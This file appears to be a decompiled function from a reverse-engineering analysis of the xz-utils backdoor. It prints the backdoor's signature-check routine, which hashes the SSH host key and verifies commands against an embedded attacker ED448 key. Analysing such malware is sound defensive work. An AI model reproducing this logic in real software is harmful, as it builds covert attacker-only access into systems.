// /home/kali/xzre-ghidra/xzregh/107630_verify_signature.c
// Function: verify_signature @ 0x107630
// Calling convention: __stdcall
// Prototype: BOOL __stdcall verify_signature(sshkey * sshkey, u8 * signed_data, u64 sshkey_digest_offset, u64 signed_data_size, u8 * signature, u8 * ed448_raw_key, global_context_t * global_ctx)


/*
 * AutoDoc: Computes the host-key hash, loads the attacker’s ED448 public key, and runs EVP_DigestVerify on the supplied signature. This gate keeps the backdoor command channel—only messages signed with the embedded ED448 key reach the executor.
 */

#include "xzre_types.h"

BOOL verify_signature(sshkey *sshkey,u8 *signed_data,u64 sshkey_digest_offset,u64 signed_data_size,
                     u8 *signature,u8 *ed448_raw_key,global_context_t *global_ctx)

{
  ulong tbslen;
  imported_funcs_t *piVar1;
  EC_KEY *key;
  u8 *puVar2;
  BOOL BVar3;
  uint uVar4;
  int iVar5;
  EC_POINT *p;
  EC_GROUP *group;
  size_t sVar6;
  EVP_PKEY *pkey;
  EVP_MD_CTX *ctx;
  long lVar7;
  size_t sVar8;
  undefined4 *puVar9;
  undefined8 local_c1;
  undefined8 uStack_b9;
  undefined4 local_b1 [32];
  
  if (sshkey == (sshkey *)0x0) {
    return FALSE;
  }
  if (signed_data == (u8 *)0x0) {
    return FALSE;
  }
  if (signed_data_size == 0) {
    return FALSE;
  }
  if (0xffffffffffffffde < sshkey_digest_offset) {
    return FALSE;
  }
  tbslen = sshkey_digest_offset + 0x20;
  if (global_ctx == (global_context_t *)0x0) {
    return FALSE;
  }
  if (signed_data_size < tbslen) {
    return FALSE;
  }
  piVar1 = global_ctx->imported_funcs;
  if (piVar1 == (imported_funcs_t *)0x0) {
    return FALSE;
  }
  iVar5 = sshkey->type;
  if (iVar5 == 2) {
    key = sshkey->ecdsa;
    local_c1 = 0;
    uStack_b9 = 0;
    puVar9 = local_b1;
    for (lVar7 = 0x79; lVar7 != 0; lVar7 = lVar7 + -1) {
      *(BOOL *)puVar9 = signed_data_size < tbslen;
      puVar9 = (undefined4 *)((long)puVar9 + 1);
    }
    if (key == (EC_KEY *)0x0) {
      return FALSE;
    }
    if (piVar1->EC_KEY_get0_public_key == (pfn_EC_KEY_get0_public_key_t)0x0) {
      return FALSE;
    }
    if (piVar1->EC_KEY_get0_group == (pfn_EC_KEY_get0_group_t)0x0) {
      return FALSE;
    }
    if (piVar1->EC_POINT_point2oct == (pfn_EC_POINT_point2oct_t)0x0) {
      return FALSE;
    }
    p = (*piVar1->EC_KEY_get0_public_key)(key);
    group = (*piVar1->EC_KEY_get0_group)(key);
    sVar8 = (*piVar1->EC_POINT_point2oct)(group,p,4,(uchar *)0x0,0,(BN_CTX *)0x0);
    if (0x85 < sVar8) {
      return FALSE;
    }
    uVar4 = (uint)sVar8;
    local_c1 = CONCAT44(*(uint *)((u8 *)&local_c1 + 4),
                        uVar4 >> 0x18 | (uVar4 & 0xff0000) >> 8 | (uVar4 & 0xff00) << 8 |
                        uVar4 << 0x18);
    sVar6 = (*piVar1->EC_POINT_point2oct)
                      (group,p,4,(uchar *)((long)&local_c1 + 4),sVar8,(BN_CTX *)0x0);
    if (sVar8 != sVar6) {
      return FALSE;
    }
    sVar8 = sVar8 + 4;
  }
  else {
    if (iVar5 < 3) {
      if (iVar5 == 0) {
        BVar3 = rsa_key_hash(sshkey->rsa,signed_data + sshkey_digest_offset,
                             signed_data_size - sshkey_digest_offset,piVar1);
      }
      else {
        if (iVar5 != 1) {
          return FALSE;
        }
        BVar3 = dsa_key_hash(sshkey->dsa,signed_data + sshkey_digest_offset,
                             signed_data_size - sshkey_digest_offset,global_ctx);
      }
      goto LAB_001076f8;
    }
    if (iVar5 != 3) {
      return FALSE;
    }
    puVar2 = sshkey->ed25519_pk;
    uStack_b9 = 0;
    puVar9 = local_b1;
    for (lVar7 = 5; lVar7 != 0; lVar7 = lVar7 + -1) {
      *puVar9 = 0;
      puVar9 = puVar9 + 1;
    }
    if (puVar2 == (u8 *)0x0) {
      return FALSE;
    }
    local_c1 = 0x20000000;
    lVar7 = 0;
    do {
      *(u8 *)((long)&local_c1 + lVar7 + 4) = puVar2[lVar7];
      lVar7 = lVar7 + 1;
    } while (lVar7 != 0x20);
    sVar8 = 0x24;
  }
  BVar3 = sha256(&local_c1,sVar8,signed_data + sshkey_digest_offset,
                 signed_data_size - sshkey_digest_offset,piVar1);
LAB_001076f8:
  if ((((BVar3 != FALSE) && (piVar1 = global_ctx->imported_funcs, piVar1 != (imported_funcs_t *)0x0)
       ) && (BVar3 = contains_null_pointers(&piVar1->EVP_PKEY_new_raw_public_key,6), BVar3 == FALSE)
      ) && ((ed448_raw_key != (u8 *)0x0 &&
            (pkey = (*piVar1->EVP_PKEY_new_raw_public_key)(0x440,(ENGINE *)0x0,ed448_raw_key,0x39),
            pkey != (EVP_PKEY *)0x0)))) {
    ctx = (*piVar1->EVP_MD_CTX_new)();
    if (ctx != (EVP_MD_CTX *)0x0) {
      iVar5 = (*piVar1->EVP_DigestVerifyInit)
                        (ctx,(EVP_PKEY_CTX **)0x0,(EVP_MD *)0x0,(ENGINE *)0x0,pkey);
      if ((iVar5 == 1) &&
         (iVar5 = (*piVar1->EVP_DigestVerify)(ctx,signature,0x72,signed_data,tbslen), iVar5 == 1)) {
        (*piVar1->EVP_MD_CTX_free)(ctx);
        (*piVar1->EVP_PKEY_free)(pkey);
        return TRUE;
      }
      (*piVar1->EVP_MD_CTX_free)(ctx);
    }
    (*piVar1->EVP_PKEY_free)(pkey);
  }
  return FALSE;
}

